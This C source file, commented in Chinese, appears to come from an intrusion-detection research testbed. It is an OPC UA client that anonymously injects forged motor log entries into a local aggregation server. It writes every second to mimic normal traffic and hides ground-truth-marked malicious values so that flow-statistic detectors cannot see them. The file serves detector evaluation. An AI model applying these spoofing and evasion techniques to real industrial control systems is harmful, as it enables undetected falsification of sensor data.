// =============================================================================
// 進階 S 攻擊：消除流量指紋的隱蔽欺騙（stealth_spoof）
// =============================================================================
// 動機（來自 net/GNN_DATASET.md 的分析）：
//   舊版 spoof_attack 雖然「連上→潛伏→稀疏注入」看似隱蔽，但在**網路層**留下
//   一個致命指紋：它只在極少數秒（8/611）有流量，而所有正常 client 每秒都在
//   寫 log。單看「每條連線出現幾秒」就能一眼分出攻擊者 —— 這讓不用圖的
//   RandomForest 就能 PR-AUC 1.000，GNN 完全沒有發揮空間。
//
// 本版的核心改動：**攻擊者也每秒都寫**，把自己藏進正常流量的節奏裡。
//   - 每秒寫一筆「看起來正常」的 motor log（值在量程內、擬真）
//   - 只有其中一小部分秒，寫的是「惡意」的偽造值（真正的攻擊 payload）
//
// 2026-08-08 修正（項目 A）：舊版寫的是 "[Sensor] Updated distance: ... cm"，
//   模板與真 motor 不同、字串較短 → 寫入 payload 大小（bytes_c2s/max_payload）與真
//   motor 的日誌寫入不一致，RandomForest 光看單邊 payload 就能分出攻擊者（實測
//   advanced_holdout RF PR-AUC=0.254 > GNN 0.155）。等於「時間指紋」被搬成了「大小指紋」。
//   本版改成**逐字模仿真 motor 的日誌寫入模板** "[Motor] Received distance: %.15g cm"，
//   讓寫入 payload 與真 motor 同形；惡意秒仍用同模板、相近長度，只在尾端埋 #MAL 記號。
//   如此單邊流量統計不再可分，攻擊只剩「SourceNode=null」與「跨節點值不符」這兩個需要
//   log 語意 / 圖結構才看得到的破綻 —— 這正是要證明 GNN 價值的場景。
//   於是攻擊連線的每秒流量特徵（3 封包/秒）與正常 client 完全一致，
//   「出現秒數」也是全程 611 秒 —— 指紋消失。
//
// 這才是真實 APT 的樣態：不是打帶跑，而是長期潛伏、混入正常節奏。
//   偵測它需要看「內容/語意」或「跨節點關聯」，不能只看單條連線的流量統計。
//
// ground truth 標記：
//   攻擊者所有寫入都被伺服器蓋上 SourceNode=null（匿名），但**只有惡意注入的
//   那幾秒**才是真正的異常。為了讓下游能精準標記，惡意行在訊息尾端埋一個
//   隱形記號 " #MAL"（伺服器 append SourceNode 時不影響），build_graph 可據此
//   只標「惡意秒」而非「攻擊者存在的每一秒」。
//   —— 真實偵測器看不到這個記號；它純粹是給評估用的 ground truth 通道。
//
// ⚠️ 僅用於你自己機器上、你自己系統的授權安全測試。
// =============================================================================
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <time.h>
#include <unistd.h>
#include <string.h>
#include <open62541/client_config_default.h>
#include <open62541/client_highlevel.h>

#ifndef BASELINE_SEC
#define BASELINE_SEC    300    // 潛伏總時長（秒）
#endif
#ifndef N_MALICIOUS
#define N_MALICIOUS     20     // 其中有幾秒寫的是惡意偽造值（其餘秒寫正常值）
#endif
#define DIST_MIN        2.0
#define DIST_MAX        50.0
// ⚠️ 大小對齊（2026-08-09 修）：ground truth 記號會改變寫入行的長度，
//    而長度直接反映在 pcap 的 bytes_c2s 上 —— 實測 compromised 場景惡意秒的
//    bytes_c2s 中位數比正常秒**正好多 5 bytes**（= " #MAL" 的長度），於是
//    「無圖無值 RF」在 random 切分下拿到 PR-AUC 1.000：它抓到的是**評估記號**，
//    不是攻擊。修法：正常秒補一個等長的良性記號 " #BEN"，兩類行等長，
//    記號在網路層完全不可見（偵測器仍看不到記號，read_log 只認 #MAL）。
#define MAL_MARK        " #MAL"
#define BEN_MARK        " #BEN"   // 與 MAL_MARK 等長的填充，消除大小指紋

static volatile UA_Boolean running = true;
static void stopHandler(int sig) { (void)sig; running = false; }

static void build_fake_log(char *out, size_t outlen, const char *msg) {
    UA_DateTimeStruct dts = UA_DateTime_toStruct(UA_DateTime_now());
    snprintf(out, outlen,
             "[%04u-%02u-%02u %02u:%02u:%02u.%03u (UTC)] info/application\t%s",
             dts.year, dts.month, dts.day, dts.hour, dts.min, dts.sec,
             dts.milliSec, msg);
}

static UA_StatusCode inject_log(UA_Client *client, const char *line) {
    UA_Variant v;
    UA_String s = UA_STRING((char *)line);
    UA_Variant_setScalar(&v, &s, &UA_TYPES[UA_TYPES_STRING]);
    return UA_Client_writeValueAttribute(client, UA_NODEID_STRING(1, "CentralLogIn"), &v);
}

int main(void) {
    setvbuf(stdout, NULL, _IOLBF, 0);
    signal(SIGINT, stopHandler);
    signal(SIGTERM, stopHandler);

    UA_Client *client = UA_Client_new();
    UA_ClientConfig_setDefault(UA_Client_getConfig(client));

    printf("[STEALTH] Connecting to aggregation_server@4840 (anonymous)...\n");
    if (UA_Client_connect(client, "opc.tcp://127.0.0.1:4840") != UA_STATUSCODE_GOOD) {
        printf("[STEALTH] Connect failed\n"); UA_Client_delete(client); return 1;
    }
    printf("[STEALTH] Connected. Writing EVERY second for %d s; %d of them malicious.\n",
           BASELINE_SEC, N_MALICIOUS);

    srand((unsigned)time(NULL) ^ 0xC0FFEE);

    // 隨機選 N_MALICIOUS 個「惡意秒」，其餘秒寫正常值（藏進節奏裡）
    int mal_at[N_MALICIOUS];
    for (int i = 0; i < N_MALICIOUS; i++) mal_at[i] = rand() % BASELINE_SEC;

    int is_mal[BASELINE_SEC];
    memset(is_mal, 0, sizeof(is_mal));
    for (int i = 0; i < N_MALICIOUS; i++) is_mal[mal_at[i]] = 1;

    time_t start = time(NULL);
    int last_written = -1, n_mal = 0;
    char line[1024], msg[256];

    while (running) {
        int elapsed = (int)(time(NULL) - start);
        if (elapsed >= BASELINE_SEC) break;

        // 每「新的一秒」寫一筆 —— 與正常 client 的節奏一致
        if (elapsed != last_written) {
            last_written = elapsed;
            double d = DIST_MIN + ((double)rand() / RAND_MAX) * (DIST_MAX - DIST_MIN);
            if (is_mal[elapsed]) {
                // 惡意秒：注入一個「同秒雙報」的偽造讀數（S 的真正破綻），並埋 ground
                // truth 記號。⚠️ 用與真 motor **完全相同**的模板（見下方 else 分支），
                // 只在尾端附 #MAL —— 讓寫入 payload 大小與正常秒、與真 motor 都相近，
                // 不留單邊大小指紋。真正的破綻在「同秒雙報 + SourceNode=null」，非 payload。
                snprintf(msg, sizeof(msg),
                         "[Motor] Received distance: %.1f cm%s", d, MAL_MARK);
                n_mal++;
                printf("[STEALTH] t=%ds MALICIOUS inject: %.3g\n", elapsed, d);
            } else {
                // 正常秒：逐字模仿真 motor 的日誌寫入（motor_sub 寫的是
                //   "[Motor] Received distance: <值> cm"）→ 寫入 payload 與真 motor 同形，
                //   藏進流量節奏，單邊流量統計無法區分。
                snprintf(msg, sizeof(msg),
                         "[Motor] Received distance: %.1f cm%s", d, BEN_MARK);
            }
            build_fake_log(line, sizeof(line), msg);
            inject_log(client, line);
        }

        UA_Client_run_iterate(client, 0);
        usleep(100000);   // 100ms 一輪
    }

    printf("[STEALTH] Done (%d malicious of %d seconds). Disconnecting.\n",
           n_mal, BASELINE_SEC);
    UA_Client_disconnect(client);
    UA_Client_delete(client);
    return 0;
}
